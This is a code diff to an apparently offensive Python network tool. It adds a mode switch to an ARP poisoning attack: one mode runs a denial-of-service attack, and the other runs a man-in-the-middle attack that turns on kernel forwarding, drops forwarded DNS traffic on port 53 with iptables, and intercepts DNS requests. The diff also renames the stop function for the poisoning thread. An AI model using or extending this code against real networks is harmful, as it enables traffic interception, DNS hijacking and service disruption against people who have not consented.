@@ -90,7 +90,7 @@ def start_arp_mitm(group1, group2, self_mac, interface):
 
 	return thread, stop_event
 
-def stop_arp_mitm(thread, group1, group2, stop_event, interface):
+def stop_arp_poison(thread, group1, group2, stop_event, interface):
 	print("Stopping ARP poisoning thread...")
 	# signal the poison thread to stop
 	stop_event.set()
@@ -176,17 +176,25 @@ def allow_port_53():
 	run("iptables -D FORWARD -p tcp --dport 53 -j DROP")
 	
 def start_attack(group1, group2, self_ip, self_mac, interface):
-	enable_kernel_forwarding(interface)
+	if (config.arp.dos_enabled):
+		print("Starting DoS attack...")
+	else:
+		print("Starting MITM attack...")
+		enable_kernel_forwarding(interface)
 
 	thread, stop_event = start_arp_mitm(group1, group2, self_mac, interface)
-	drop_port_53()
 
-	intercept_pkts(self_mac, interface, only_dns_request, print_fn)
+	if not config.arp.dos_enabled and config.dns.enabled:
+		drop_port_53()
+		intercept_pkts(self_mac, interface, only_dns_request, print_fn)
+	else:
+		input("\nPress Enter to stop the attack...\n")
 
 	input("\nstop")
 
-	stop_arp_mitm(thread, group1, group2, stop_event, interface)
-	allow_port_53()
+	stop_arp_poison(thread, group1, group2, stop_event, interface)
+	if not config.arp.dos_enabled and config.dns.enabled:
+		allow_port_53()
 	cleanup_forward(interface)
 
 # placeholder
